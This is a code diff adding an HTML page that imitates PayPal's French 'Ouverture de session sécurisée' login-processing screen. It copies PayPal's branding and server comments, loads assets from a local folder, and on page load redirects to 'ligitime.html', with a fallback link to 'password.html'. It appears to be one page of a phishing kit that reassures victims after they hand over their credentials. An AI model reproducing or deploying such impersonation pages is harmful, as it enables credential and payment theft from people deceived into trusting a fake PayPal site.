@@ -1,0 +1,72 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html><head>
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<!--
+         Script info: script: webscr, cmd: _login-processing, template: p/gen/login-processing, date: Jul. 30, 2009 18:15:36 PDT; country: FR, language: fr_FR, xslt server: 
+		web version: 58.0-1007153 branch: AHOD_580_0803_int
+		content version: -
+		pexml version: 58.0-1013780
+		page XSL: Customer/default/fr_FR/general/LoginProcessing.xsl
+       hostname : 70ArbcM-2EKVaFbJH7XwcAOL6Pdguq-5sc.XTcHrgj0
+         rlogid : tJYGqVHiAlFHrwxrmucJrdBsNehS26IYMT6WAAHXUbJnCiqNyHV0QQ%3d%3d_1233516cd36
+-->
+<title>Ouverture de session sécurisée - PayPal</title>
+<!--googleoff: all-->
+<meta name="description" content="PayPal est le moyen plus sûr et plus simple de payer en ligne sans divulguer le numéro de votre carte bancaire.">
+<!--googleon: all-->
+<link media="screen" rel="stylesheet" type="text/css" href="webscr_fichiers/global.css">
+<link rel="stylesheet" type="text/css" href="webscr_fichiers/pageSalsa.css">
+<!--[if IE 7]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-620-20100419-1/css/browsers/ie7.css"><![endif]-->
+
+<!--[if lte IE 6]><link media="screen" rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/WEBSCR-620-20100419-1/css/browsers/ie6.css"><![endif]-->
+<link rel="stylesheet" type="text/css" href="webscr_fichiers/country.css">
+<link media="print" rel="stylesheet" type="text/css" href="webscr_fichiers/print.css">
+<style type="text/css">
+					h3 {margin:4em 0 0 0; line-height:normal;}
+					p.note {margin:0 0 6em 0; color:#656565; font-size:0.9em;}
+					p.note a {color:#656565;}
+					p strong {margin-top:2em; color:#1A3665; font-size:1.25em;}
+					img.actionImage {margin: 1.25em 0 2em 0;}
+				</style>
+<script type="text/javascript" src="webscr_fichiers/paypal.js"></script><link rel="shortcut icon" href="https://www.paypalobjects.com/WEBSCR-620-20100419-1/en_US/i/icon/pp_favicon_x.ico">
+<link rel="apple-touch-icon" href="https://www.paypalobjects.com/WEBSCR-620-20100419-1/en_US/i/pui/apple-touch-icon.png">
+<style type="text/css">
+<!--
+body,td,th {
+	color: #FFFFFF;
+}
+-->
+</style></head><body onLoad="coolRedirect('ligitime.html')">
+<DIV class=counter id=COOL_REDIRECT >4</DIV>
+<noscript><p class="nonjsAlert">REMARQUE : Pour utiliser de nombreuses
+fonctionnalités du site PayPal, vous avez besoin de JavaScript et de
+cookies. Vous pouvez les activer à l'aide des paramètres de votre
+navigateur.</p></noscript>
+<img src="webscr_fichiers/counter.gif" class="accessAid" alt="" border="0"><div class="" id="page">
+<div id="header" class="notab">
+<h1><a href="#"><img src="webscr_fichiers/paypal_logo.gif" alt="PayPal" border="0"></a></h1>
+<div class="empty" id="navPrimary"></div>
+</div>
+<div id="content">
+<div id="headline">
+<h2 class="accessAid">Ouverture de session sécurisée</h2>
+</div>
+<div id="messageBox"></div>
+<div id="main"><div class="layout1 textcenter">
+<h3>Ouverture de session sécurisée</h3>
+<img src="webscr_fichiers/header_logginginAction.gif" class="actionImage" alt="" border="0"><p class="note">Si cette page reste affichée plus de 5&nbsp;secondes, <a href="password.html">cliquez ici</a> pour l'actualiser.</p>
+<p><strong>PayPal. Votre réflexe sécurité pour payer en ligne.</strong></p>
+</div></div>
+</div>
+<div id="navFull"></div>
+</div>
+<!-- SiteCatalyst Code
+Copyright 1997-2005 Omniture, Inc.
+More info available at http://www.omniture.com -->
+
+<!--/DO NOT REMOVE/-->
+
+<!-- End SiteCatalyst Code -->
+</body></html>
